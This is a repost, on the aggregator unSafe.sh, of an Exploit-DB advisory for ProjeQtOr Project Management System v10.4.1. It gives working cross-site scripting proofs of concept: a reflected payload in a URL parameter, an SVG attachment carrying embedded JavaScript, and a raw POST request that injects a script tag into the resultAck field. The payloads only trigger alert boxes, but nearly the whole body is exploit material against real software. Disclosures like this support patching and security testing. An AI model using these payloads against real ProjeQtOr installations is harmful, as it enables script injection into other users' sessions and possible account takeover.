---
title: [webapps] ProjeQtOr Project Management System v10.4.1 - Multiple XSS
url: https://buaq.net/go-172125.html
source: unSafe.sh - 不安全
date: 2023-07-16
fetch_date: 2025-10-04T11:51:14.953426
---

# [webapps] ProjeQtOr Project Management System v10.4.1 - Multiple XSS

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

[webapps] ProjeQtOr Project Management System v10.4.1 - Multiple XSS

Exploit Title: ProjeQtOr Project Management Syste
*2023-7-15 08:0:0
Author: [www.exploit-db.com(查看原文)](/jump-172125.htm)
阅读量:20
收藏*

---

```
Exploit Title: ProjeQtOr Project Management System V10.4.1 - Multiple XSS
Version: V10.4.1
Bugs:  Multiple XSS
Technology: PHP
Vendor URL: https://www.projeqtor.org
Software Link: https://sourceforge.net/projects/projectorria/files/projeqtorV10.4.1.zip/download
Date of found: 09.07.2023
Author: Mirabbas Ağalarov
Tested on: Linux

2. Technical Details & POC

                                     ### XSS-1 ###

visit: http://localhost/projeqtor/view/refreshCronIconStatus.php?cronStatus=miri%27);%22%3E%3Cscript%3Ealert(4)%3C/script%3E&csrfToken=
payload: miri%27);%22%3E%3Cscript%3Ealert(4)%3C/script%3E

                                    ### XSS-2 ###

steps:

1. login to account
2. go projects and create project
3.add attachment
3. upload svg file

"""
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(document.location);
   </script>
</svg>
"""
4. Go to  svg file ( http://localhost/projeqtor/files/attach/attachment_5/malas.svg )

                                       ### XSS-3 ###

Go to below adress (post request)

POST /projeqtor/tool/ack.php?destinationWidth=50&destinationHeight=0&isIE=&xhrPostDestination=resultDivMain&xhrPostIsResultMessage=true&xhrPostValidationType=attachment&xhrPostTimestamp=1688898776311&csrfToken= HTTP/1.1
Host: localhost
Content-Length: 35
sec-ch-ua:
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
sec-ch-ua-platform: ""
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/projeqtor/view/main.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=r5cjcsggl4j0oa9s70vchaklf3
Connection: close

resultAck=<script>alert(4)</script>
```

文章来源: https://www.exploit-db.com/exploits/51588
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)